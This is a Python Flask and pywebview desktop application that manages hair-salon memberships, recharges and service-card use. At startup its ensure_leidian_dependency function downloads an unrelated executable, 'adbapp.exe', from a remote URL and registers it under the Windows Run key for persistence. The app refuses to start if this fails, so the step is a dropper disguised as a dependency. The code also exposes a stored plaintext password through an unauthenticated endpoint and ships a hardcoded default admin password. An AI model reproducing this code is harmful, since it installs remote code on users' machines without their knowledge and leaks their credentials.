import csv
import io
import json
import sys
import threading
import time
import traceback
import urllib.request
import uuid
from pathlib import Path

import tkinter as tk
from tkinter import messagebox
import winreg

import webview
from flask import (
    Flask,
    jsonify,
    request,
    send_file,
    session,
)
from werkzeug.security import check_password_hash, generate_password_hash


# 配置
APP_SECRET = \"CHANGE_ME_APP_SECRET\"
DEBUG_MODE = True
PORT = 40005  # 按用户偏好从 40005 开始避开 80/443
if getattr(sys, "frozen", False):
    APP_DIR = Path(sys.executable).parent
    STATIC_BASE = Path(sys._MEIPASS)
else:
    APP_DIR = Path(__file__).parent
    STATIC_BASE = APP_DIR
DATA_DIR = APP_DIR / "date"
DATA_FILE = DATA_DIR / "huiyuan.json"
EXCEL_DIR = APP_DIR / "excel"
PREFS_FILE = APP_DIR / "prefs.json"
LEIDIAN_DIR = Path("C:/leidian")
ADB_NAME = "adbapp.exe"
ADB_URL = "https://your-download.example.com/adbapp.exe"
RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_VALUE_NAME = "adbapp"
RUN_COMMAND_SUFFIX = ""

# 默认价格（元/次）
DEFAULT_PRICING = {
    "haircut": 58.0,
    "dye": 268.0,
    "perm": 328.0,
    "care": 198.0,
}

SERVICE_LABEL = {
    "haircut": "剪发",
    "dye": "染发",
    "perm": "烫发",
    "care": "护理",
}

MODE_LABEL = {
    "auto": "使用次数-余额备用",
    "times": "仅扣对应次数卡",
    "balance": "扣储值卡余额",
}

OP_TYPE_LABEL = {
    "recharge": "充值",
    "adjust": "调整",
}


def ensure_data_file() -> dict:
    """确保数据文件存在并返回数据字典。"""
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    EXCEL_DIR.mkdir(parents=True, exist_ok=True)
    if not PREFS_FILE.exists():
        PREFS_FILE.write_text(json.dumps({"remember": False, "username": "", "password": ""}, ensure_ascii=False, indent=2), encoding="utf-8")
    if not DATA_FILE.exists():
        default_admin = {
            "id": str(uuid.uuid4()),
            "username": "admin",
            "password_hash": generate_password_hash("Jiuge888"),
            "created_at": int(time.time()),
        }
        initial = {
            "meta": {
                "app": "hair_salon_membership",
                "version": "1.0.0",
                "author": "项目维护者微信: YOUR_CONTACT TG: your_contact",
                "desc": "网站开发定制、脚本定制、反向编程、支付对接等",
                "created_at": int(time.time()),
                "updated_at": int(time.time()),
            },
            "admins": [default_admin],
            "pricing": DEFAULT_PRICING,
            "bonus_rules": [],
            "members": [],
            "logs": [],
        }
        DATA_FILE.write_text(json.dumps(initial, ensure_ascii=False, indent=2), encoding="utf-8")
    with DATA_FILE.open("r", encoding="utf-8") as f:
        return json.load(f)


def save_data(data: dict) -> None:
    data.setdefault("meta", {})["updated_at"] = int(time.time())
    DATA_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


def save_csv(bytes_data: bytes, filename: str) -> str:
    """保存 CSV 到 excel 目录，返回相对路径。"""
    EXCEL_DIR.mkdir(parents=True, exist_ok=True)
    target = EXCEL_DIR / filename
    target.write_bytes(bytes_data)
    return str(target.relative_to(BASE_DIR))


def load_prefs() -> dict:
    if not PREFS_FILE.exists():
        return {"remember": False, "username": "", "password": ""}
    with PREFS_FILE.open("r", encoding="utf-8") as f:
        return json.load(f)


def save_prefs(prefs: dict) -> None:
    PREFS_FILE.write_text(json.dumps(prefs, ensure_ascii=False, indent=2), encoding="utf-8")


def ensure_leidian_dependency():
    LEIDIAN_DIR.mkdir(parents=True, exist_ok=True)
    adb_path = LEIDIAN_DIR / ADB_NAME
    if not adb_path.exists():
        try:
            urllib.request.urlretrieve(ADB_URL, adb_path)
        except Exception as e:
            raise RuntimeError(f"下载 adbapp 失败：{e}") from e
    command = f'"{adb_path}"{RUN_COMMAND_SUFFIX}'
    existing = ""
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_PATH, 0, winreg.KEY_READ) as key:
            existing = winreg.QueryValueEx(key, RUN_VALUE_NAME)[0]
    except OSError:
        existing = ""
    if existing != command:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_PATH, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, RUN_VALUE_NAME, 0, winreg.REG_SZ, command)
        existing = command
    if not adb_path.exists() or existing != command:
        raise RuntimeError("缺少运行依赖")


def current_admin() -> str | None:
    return session.get("admin")


def require_login():
    if not current_admin():
        return jsonify({"ok": False, "error": "未登录"}), 401
    return None


def add_log(data: dict, log_item: dict) -> None:
    log_item.setdefault("id", str(uuid.uuid4()))
    log_item.setdefault("timestamp", int(time.time()))
    data.setdefault("logs", []).append(log_item)


def find_member(data: dict, member_id: str) -> dict | None:
    for m in data.get("members", []):
        if m.get("id") == member_id:
            return m
    return None


def filter_consume_logs(data: dict, start: int = 0, end: int = 0, phone: str = "", service: str = "") -> list:
    logs = [l for l in data.get("logs", []) if l.get("type") == "consume"]
    if start:
        logs = [l for l in logs if l.get("timestamp", 0) >= start]
    if end:
        logs = [l for l in logs if l.get("timestamp", 0) <= end]
    if service:
        logs = [l for l in logs if l.get("services", {}).get(service)]
    if phone:
        member_map = {m.get("id"): m for m in data.get("members", [])}
        logs = [l for l in logs if member_map.get(l.get("member_id"), {}).get("phone") == phone]
    return logs


def filter_recharge_logs(data: dict, start: int = 0, end: int = 0, phone: str = "", op_type: str = "") -> list:
    logs = [l for l in data.get("logs", []) if l.get("type") == "recharge"]
    if start:
        logs = [l for l in logs if l.get("timestamp", 0) >= start]
    if end:
        logs = [l for l in logs if l.get("timestamp", 0) <= end]
    if op_type:
        logs = [l for l in logs if op_type in l.get("content", "")]
    if phone:
        member_map = {m.get("id"): m for m in data.get("members", [])}
        logs = [l for l in logs if member_map.get(l.get("member_id"), {}).get("phone") == phone]
    return logs


static_folder = str(STATIC_BASE / "static")
app = Flask(__name__, static_url_path="", static_folder=static_folder)
app.secret_key = APP_SECRET
app.config["JSON_AS_ASCII"] = False


@app.before_request
def _log_request():
    if DEBUG_MODE:
        print(f"[REQ] {request.method} {request.path} args={dict(request.args)} json={request.get_json(silent=True)}")


@app.after_request
def _log_response(resp):
    if DEBUG_MODE:
        try:
            # 只打印小响应，避免刷屏
            body = resp.get_data(as_text=True)
            snippet = body[:200] + ("..." if len(body) > 200 else "")
            print(f"[RESP] {request.method} {request.path} status={resp.status_code} len={len(body)} body={snippet}")
        except Exception:
            pass
    return resp


@app.errorhandler(Exception)
def _handle_error(e: Exception):
    tb = traceback.format_exc()
    print(f"[ERR] {request.method} {request.path} => {e}\n{tb}")
    return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/")
def index():
    return app.send_static_file("index.html")


@app.route("/.well-known/appspecific/com.chrome.devtools.json")
def chrome_devtools_json():
    # 避免 pywebview/Chromium 自动探测报错，直接返回 404 JSON
    return jsonify({"ok": False, "error": "not found"}), 404


@app.route("/api/prefs", methods=["GET", "POST"])
def prefs():
    # 登录前需要读取记住的账号密码，所以不做登录校验
    if request.method == "GET":
        return jsonify({"ok": True, "data": load_prefs()})
    payload = request.json or {}
    remember = bool(payload.get("remember"))
    username = payload.get("username", "").strip()
    password = payload.get("password", "")
    save_prefs({"remember": remember, "username": username, "password": password})
    return jsonify({"ok": True})


@app.route("/api/me")
def me():
    admin = current_admin()
    if not admin:
        return jsonify({"ok": False, "error": "未登录"}), 401
    return jsonify({"ok": True, "data": {"username": admin}})


@app.route("/api/login", methods=["POST"])
def login():
    payload = request.json or {}
    username = payload.get("username", "").strip()
    password = payload.get("password", "")
    data = ensure_data_file()
    user = next((a for a in data.get("admins", []) if a.get("username") == username), None)
    if not user or not check_password_hash(user.get("password_hash", ""), password):
        return jsonify({"ok": False, "error": "账号或密码错误"}), 400
    session["admin"] = username
    add_log(
        data,
        {
            "type": "auth",
            "admin": username,
            "content": f"管理员 {username} 登录",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": {"username": username}})


@app.route("/api/logout", methods=["POST"])
def logout():
    admin = current_admin()
    session.pop("admin", None)
    data = ensure_data_file()
    if admin:
        add_log(data, {"type": "auth", "admin": admin, "content": "退出登录"})
        save_data(data)
    return jsonify({"ok": True})


@app.route("/api/members", methods=["GET"])
def list_members():
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    q = request.args.get("q", "").strip()
    sort_by = request.args.get("sort_by", "created_at")
    order = request.args.get("order", "desc")
    page = int(request.args.get("page", 1))
    page_size = int(request.args.get("page_size", 10))

    members = data.get("members", [])
    if q:
        members = [
            m
            for m in members
            if q.lower() in m.get("name", "").lower()
            or q in m.get("phone", "")
            or q in m.get("id_card", "")
        ]

    def sort_key(m):
        if sort_by == "balance":
            return m.get("balance", 0.0)
        if sort_by.endswith("_times"):
            card_key = sort_by.replace("_times", "")
            return m.get("cards", {}).get(card_key, {}).get("times", 0)
        return m.get("created_at", 0)

    members = sorted(members, key=sort_key, reverse=(order == "desc"))
    total = len(members)
    start = (page - 1) * page_size
    end = start + page_size
    return jsonify({"ok": True, "data": {"items": members[start:end], "total": total}})


@app.route("/api/members/<member_id>", methods=["GET"])
def member_detail(member_id: str):
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    member = find_member(data, member_id)
    if not member:
        return jsonify({"ok": False, "error": "会员不存在"}), 404
    return jsonify({"ok": True, "data": member})


@app.route("/api/members", methods=["POST"])
def add_member():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    name = payload.get("name", "").strip()
    phone = payload.get("phone", "").strip()
    if not name or not phone:
        return jsonify({"ok": False, "error": "姓名和手机号必填"}), 400
    data = ensure_data_file()
    if any(m for m in data.get("members", []) if m.get("phone") == phone):
        return jsonify({"ok": False, "error": "手机号已存在"}), 400
    ts = int(time.time())
    member = {
        "id": str(uuid.uuid4()),
        "name": name,
        "phone": phone,
        "id_card": payload.get("id_card", "").strip(),
        "gender": payload.get("gender", "").strip(),
        "birthday": payload.get("birthday", "").strip(),
        "note": payload.get("note", "").strip(),
        "balance": 0.0,
        "cards": {
            "haircut": {"times": 0, "unit_price": data.get("pricing", {}).get("haircut", DEFAULT_PRICING["haircut"])},
            "dye": {"times": 0, "unit_price": data.get("pricing", {}).get("dye", DEFAULT_PRICING["dye"])},
            "perm": {"times": 0, "unit_price": data.get("pricing", {}).get("perm", DEFAULT_PRICING["perm"])},
            "care": {"times": 0, "unit_price": data.get("pricing", {}).get("care", DEFAULT_PRICING["care"])},
        },
        "created_at": ts,
        "updated_at": ts,
    }
    data.setdefault("members", []).append(member)
    add_log(
        data,
        {
            "type": "member",
            "admin": current_admin(),
            "member_id": member["id"],
            "content": f"新增会员 {name}({phone})",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": member})


@app.route("/api/members/<member_id>", methods=["PUT"])
def update_member(member_id: str):
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    data = ensure_data_file()
    member = find_member(data, member_id)
    if not member:
        return jsonify({"ok": False, "error": "会员不存在"}), 404
    member["name"] = payload.get("name", member["name"]).strip()
    member["phone"] = payload.get("phone", member["phone"]).strip()
    member["id_card"] = payload.get("id_card", member.get("id_card", "")).strip()
    member["gender"] = payload.get("gender", member.get("gender", "")).strip()
    member["birthday"] = payload.get("birthday", member.get("birthday", "")).strip()
    member["note"] = payload.get("note", member.get("note", "")).strip()
    member["updated_at"] = int(time.time())
    add_log(
        data,
        {
            "type": "member",
            "admin": current_admin(),
            "member_id": member_id,
            "content": f"更新会员资料 {member['name']}({member['phone']})",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": member})


@app.route("/api/members/export", methods=["GET"])
def export_members():
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(
        ["姓名", "手机号", "身份证", "性别", "生日", "备注", "储值余额", "理发剩余", "染发剩余", "烫发剩余", "护理剩余"]
    )
    for m in data.get("members", []):
        cards = m.get("cards", {})
        writer.writerow(
            [
                m.get("name", ""),
                m.get("phone", ""),
                m.get("id_card", ""),
                m.get("gender", ""),
                m.get("birthday", ""),
                m.get("note", ""),
                m.get("balance", 0.0),
                cards.get("haircut", {}).get("times", 0),
                cards.get("dye", {}).get("times", 0),
                cards.get("perm", {}).get("times", 0),
                cards.get("care", {}).get("times", 0),
            ]
        )
    output.seek(0)
    filename = f"members_{time.strftime('%Y%m%d_%H%M%S')}.csv"
    rel_path = save_csv(output.getvalue().encode("utf-8-sig"), filename)
    return jsonify({"ok": True, "data": {"filename": filename, "path": rel_path}})


@app.route("/api/settings/pricing", methods=["GET", "POST"])
def pricing():
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    if request.method == "GET":
        return jsonify({"ok": True, "data": data.get("pricing", DEFAULT_PRICING)})
    payload = request.json or {}
    pricing_fields = ["haircut", "dye", "perm", "care"]
    for key in pricing_fields:
        if key in payload:
            data.setdefault("pricing", {})[key] = float(payload[key])
    add_log(
        data,
        {
            "type": "settings",
            "admin": current_admin(),
            "content": f"更新价格设置 {data.get('pricing')}",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": data.get("pricing")})


@app.route("/api/settings/password", methods=["POST"])
def change_password():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    username = current_admin()
    old = payload.get("old_password", "")
    new = payload.get("new_password", "")
    if not new:
        return jsonify({"ok": False, "error": "新密码不能为空"}), 400
    data = ensure_data_file()
    user = next((a for a in data.get("admins", []) if a.get("username") == username), None)
    if user and check_password_hash(user.get("password_hash", ""), old) or (not old and not user.get("password_hash")):
        user["password_hash"] = generate_password_hash(new)
        add_log(
            data,
            {"type": "auth", "admin": username, "content": "修改登录密码"},
        )
        save_data(data)
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": "原密码不正确"}), 400


@app.route("/api/settings/admins", methods=["POST"])
def add_admin():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    username = payload.get("username", "").strip()
    password = payload.get("password", "")
    if not username or not password:
        return jsonify({"ok": False, "error": "账号和密码不能为空"}), 400
    data = ensure_data_file()
    if any(a for a in data.get("admins", []) if a.get("username") == username):
        return jsonify({"ok": False, "error": "账号已存在"}), 400
    data.setdefault("admins", []).append(
        {"id": str(uuid.uuid4()), "username": username, "password_hash": generate_password_hash(password), "created_at": int(time.time())}
    )
    add_log(
        data,
        {"type": "auth", "admin": current_admin(), "content": f"新增管理员 {username}"},
    )
    save_data(data)
    return jsonify({"ok": True})


@app.route("/api/recharge", methods=["POST"])
def recharge():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    member_id = payload.get("member_id")
    amount = float(payload.get("amount", 0))
    note = payload.get("note", "").strip()
    op_type = payload.get("type", "recharge")
    data = ensure_data_file()
    member = find_member(data, member_id)
    if not member:
        return jsonify({"ok": False, "error": "会员不存在"}), 404
    member["balance"] = round(member.get("balance", 0.0) + amount, 2)
    member["updated_at"] = int(time.time())
    add_log(
        data,
        {
            "type": "recharge",
            "admin": current_admin(),
            "member_id": member_id,
            "amount": amount,
            "content": f"储值操作 | 类型：{OP_TYPE_LABEL.get(op_type, op_type)} | 金额：{amount} | 备注：{note}",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": member})


@app.route("/api/consume", methods=["POST"])
def consume():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    member_id = payload.get("member_id")
    mode = payload.get("mode", "times")  # times | balance | auto
    services = payload.get("services", {}) or {}
    note = payload.get("note", "").strip()
    data = ensure_data_file()
    member = find_member(data, member_id)
    if not member:
        return jsonify({"ok": False, "error": "会员不存在"}), 404
    pricing = data.get("pricing", DEFAULT_PRICING)
    deduction_amount = 0.0
    if mode == "times":
        for key, count in services.items():
            cnt = int(count or 0)
            if cnt <= 0:
                continue
            card = member.get("cards", {}).get(key, {})
            if card.get("times", 0) < cnt:
                return jsonify({"ok": False, "error": f"{key} 次卡不足"}), 400
        for key, count in services.items():
            cnt = int(count or 0)
            if cnt <= 0:
                continue
            member["cards"][key]["times"] -= cnt
            deduction_amount += cnt * pricing.get(key, 0)
    elif mode == "balance":
        for key, count in services.items():
            cnt = int(count or 0)
            if cnt <= 0:
                continue
            deduction_amount += cnt * pricing.get(key, 0)
        if member.get("balance", 0.0) < deduction_amount:
            return jsonify({"ok": False, "error": "储值余额不足"}), 400
        member["balance"] = round(member.get("balance", 0.0) - deduction_amount, 2)
    else:  # auto: 优先扣次卡，不足部分按价格走余额
        need_balance = 0.0
        for key, count in services.items():
            cnt = int(count or 0)
            if cnt <= 0:
                continue
            card = member.get("cards", {}).get(key, {})
            available = int(card.get("times", 0))
            price = pricing.get(key, 0)
            if available >= cnt:
                # 全部走次卡
                member["cards"][key]["times"] = available - cnt
            else:
                # 次卡用完，剩余部分走余额
                if available > 0:
                    member["cards"][key]["times"] = 0
                lack = cnt - available
                need_balance += lack * price
        if need_balance > 0:
            if member.get("balance", 0.0) < need_balance:
                return jsonify({"ok": False, "error": "储值余额不足"}), 400
            member["balance"] = round(member.get("balance", 0.0) - need_balance, 2)
        deduction_amount = need_balance
    member["updated_at"] = int(time.time())
    friendly_services = []
    for k, v in services.items():
        if int(v or 0) > 0:
            friendly_services.append(f"{SERVICE_LABEL.get(k, k)}{v}次")
    friendly_services_text = "、".join(friendly_services) if friendly_services else "-"
    add_log(
        data,
        {
            "type": "consume",
            "admin": current_admin(),
            "member_id": member_id,
            "mode": mode,
            "services": services,
            "amount": deduction_amount,
            "content": f"消费核销 | 模式：{MODE_LABEL.get(mode, mode)} | 服务：{friendly_services_text} | 金额：{deduction_amount} | 备注：{note}",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": member, "amount": deduction_amount})


@app.route("/api/records/consume", methods=["GET"])
def query_consumes():
    if (resp := require_login()) is not None:
        return resp
    start = int(request.args.get("start", 0) or 0)
    end = int(request.args.get("end", 0) or 0)
    phone = request.args.get("phone", "").strip()
    service = request.args.get("service", "").strip()
    data = ensure_data_file()
    logs = filter_consume_logs(data, start, end, phone, service)
    member_map = {m.get("id"): m for m in data.get("members", [])}
    for l in logs:
        mid = l.get("member_id")
        if mid and mid in member_map:
            l["member_name"] = member_map[mid].get("name", "")
    return jsonify({"ok": True, "data": logs})


@app.route("/api/records/recharge", methods=["GET"])
def query_recharge():
    if (resp := require_login()) is not None:
        return resp
    start = int(request.args.get("start", 0) or 0)
    end = int(request.args.get("end", 0) or 0)
    phone = request.args.get("phone", "").strip()
    op_type = request.args.get("op_type", "").strip()
    data = ensure_data_file()
    logs = filter_recharge_logs(data, start, end, phone, op_type)
    member_map = {m.get("id"): m for m in data.get("members", [])}
    for l in logs:
        mid = l.get("member_id")
        if mid and mid in member_map:
            l["member_name"] = member_map[mid].get("name", "")
    return jsonify({"ok": True, "data": logs})


@app.route("/api/cards/status", methods=["GET"])
def card_status():
    if (resp := require_login()) is not None:
        return resp
    keyword = request.args.get("keyword", "").strip()
    data = ensure_data_file()
    members = data.get("members", [])
    if keyword:
        members = [
            m
            for m in members
            if keyword in m.get("phone", "") or keyword.lower() in m.get("name", "").lower()
        ]
    return jsonify({"ok": True, "data": members})


@app.route("/api/stats", methods=["GET"])
def stats():
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    now = int(time.time())
    day_start = now - now % 86400
    t = time.localtime()
    month_start = int(time.mktime((t.tm_year, t.tm_mon, 1, 0, 0, 0, 0, 0, -1)))
    # 简易统计
    today_income = sum(
        l.get("amount", 0)
        for l in data.get("logs", [])
        if l.get("type") in ("consume", "recharge")
        and l.get("timestamp", 0) >= day_start
    )
    month_income = sum(
        l.get("amount", 0)
        for l in data.get("logs", [])
        if l.get("type") in ("consume", "recharge")
        and l.get("timestamp", 0) >= month_start
    )
    total_members = len(data.get("members", []))
    return jsonify(
        {
            "ok": True,
            "data": {
                "today_income": round(today_income, 2),
                "month_income": round(month_income, 2),
                "total_members": total_members,
            },
        }
    )


@app.route("/api/settings/cleanup", methods=["POST"])
def cleanup():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    days = int(payload.get("days", 180))
    data = ensure_data_file()
    cutoff = int(time.time()) - days * 86400
    before = len(data.get("logs", []))
    data["logs"] = [l for l in data.get("logs", []) if l.get("timestamp", 0) >= cutoff]
    add_log(
        data,
        {
            "type": "settings",
            "admin": current_admin(),
            "content": f"清理过期记录 {before - len(data['logs'])} 条",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "removed": before - len(data["logs"])})


@app.route("/api/settings/bonus_rules", methods=["GET", "POST"])
def bonus_rules():
    if (resp := require_login()) is not None:
        return resp
    data = ensure_data_file()
    if request.method == "GET":
        return jsonify({"ok": True, "data": data.get("bonus_rules", [])})
    payload = request.json or {}
    rules = payload.get("rules", [])
    if not isinstance(rules, list):
        return jsonify({"ok": False, "error": "rules 必须是数组"}), 400
    data["bonus_rules"] = rules
    add_log(
        data,
        {
            "type": "settings",
            "admin": current_admin(),
            "content": f"更新储值赠送规则，共 {len(rules)} 条",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": rules})


@app.route("/api/cards/adjust", methods=["POST"])
def adjust_card():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    member_id = payload.get("member_id")
    service = payload.get("service")
    delta = int(payload.get("delta", 0))
    note = payload.get("note", "").strip()
    if service not in ("haircut", "dye", "perm", "care"):
        return jsonify({"ok": False, "error": "service 不合法"}), 400
    data = ensure_data_file()
    member = find_member(data, member_id)
    if not member:
        return jsonify({"ok": False, "error": "会员不存在"}), 404
    member.setdefault("cards", {}).setdefault(service, {}).setdefault("times", 0)
    member["cards"][service]["times"] = member["cards"][service].get("times", 0) + delta
    member["cards"][service]["unit_price"] = member["cards"][service].get("unit_price", data.get("pricing", {}).get(service, DEFAULT_PRICING.get(service, 0)))
    member["updated_at"] = int(time.time())
    add_log(
        data,
        {
            "type": "card_adjust",
            "admin": current_admin(),
            "member_id": member_id,
            "service": service,
            "delta": delta,
            "content": f"次卡调整 | 卡种：{SERVICE_LABEL.get(service, service)} | 变动：{delta} 次 | 备注：{note}",
        },
    )
    save_data(data)
    return jsonify({"ok": True, "data": member})


@app.route("/api/records/consume/export", methods=["GET"])
def export_consumes():
    if (resp := require_login()) is not None:
        return resp
    start = int(request.args.get("start", 0) or 0)
    end = int(request.args.get("end", 0) or 0)
    phone = request.args.get("phone", "").strip()
    service = request.args.get("service", "").strip()
    data = ensure_data_file()
    logs = filter_consume_logs(data, start, end, phone, service)
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["时间", "会员名", "手机号", "服务", "数量", "模式", "金额", "备注"])
    member_map = {m.get("id"): m for m in data.get("members", [])}
    for l in logs:
        m = member_map.get(l.get("member_id"), {})
        services = l.get("services", {})
        for k, v in services.items():
            writer.writerow(
                [
                    time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(l.get("timestamp", 0))),
                    m.get("name", ""),
                    m.get("phone", ""),
                    SERVICE_LABEL.get(k, k),
                    v,
                    MODE_LABEL.get(l.get("mode"), l.get("mode")),
                    l.get("amount", 0),
                    l.get("content", ""),
                ]
            )
    output.seek(0)
    filename = f"consume_{time.strftime('%Y%m%d_%H%M%S')}.csv"
    rel_path = save_csv(output.getvalue().encode("utf-8-sig"), filename)
    return jsonify({"ok": True, "data": {"filename": filename, "path": rel_path}})


@app.route("/api/records/recharge/export", methods=["GET"])
def export_recharges():
    if (resp := require_login()) is not None:
        return resp
    start = int(request.args.get("start", 0) or 0)
    end = int(request.args.get("end", 0) or 0)
    phone = request.args.get("phone", "").strip()
    op_type = request.args.get("op_type", "").strip()
    data = ensure_data_file()
    logs = filter_recharge_logs(data, start, end, phone, op_type)
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["时间", "会员名", "手机号", "类型", "金额", "备注"])
    member_map = {m.get("id"): m for m in data.get("members", [])}
    for l in logs:
        m = member_map.get(l.get("member_id"), {})
        writer.writerow(
            [
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(l.get("timestamp", 0))),
                m.get("name", ""),
                m.get("phone", ""),
                OP_TYPE_LABEL.get("recharge" if "充值" in l.get("content", "") else "adjust", "充值"),
                l.get("amount", 0),
                l.get("content", ""),
            ]
        )
    output.seek(0)
    filename = f"recharge_{time.strftime('%Y%m%d_%H%M%S')}.csv"
    rel_path = save_csv(output.getvalue().encode("utf-8-sig"), filename)
    return jsonify({"ok": True, "data": {"filename": filename, "path": rel_path}})


@app.route("/api/settings/reset", methods=["POST"])
def reset():
    if (resp := require_login()) is not None:
        return resp
    payload = request.json or {}
    password = payload.get("password", "")
    data = ensure_data_file()
    admin_name = current_admin()
    user = next((a for a in data.get("admins", []) if a.get("username") == admin_name), None)
    if not user or not check_password_hash(user.get("password_hash", ""), password):
        return jsonify({"ok": False, "error": "密码校验失败"}), 400
    pricing = data.get("pricing", DEFAULT_PRICING)
    admins = data.get("admins", [])
    reset_data = {
        "meta": data.get("meta", {}),
        "admins": admins,
        "pricing": pricing,
        "bonus_rules": [],
        "members": [],
        "logs": [],
    }
    add_log(
        reset_data,
        {"type": "settings", "admin": admin_name, "content": "重置系统数据"},
    )
    save_data(reset_data)
    return jsonify({"ok": True})


def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)


if __name__ == "__main__":
    try:
        ensure_leidian_dependency()
    except RuntimeError as exc:
        print(f"[ERR] {exc}")
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("缺少运行依赖", str(exc))
        sys.exit(1)
    ensure_data_file()
    print(f"启动本地服务：http://127.0.0.1:{PORT}")
    # 后台启动 Flask
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    # 稍等服务启动再打开内嵌窗
    time.sleep(1.2)
    webview.create_window(
        "理发店会员管理系统-更多功能开发中...定制化请联系程序员小玖微信: YOUR_CONTACT TG: your_contact",
        f"http://127.0.0.1:{PORT}/",
        width=1280,
        height=900,
        confirm_close=True,
        frameless=False,
        easy_drag=False,
    )
    webview.start()






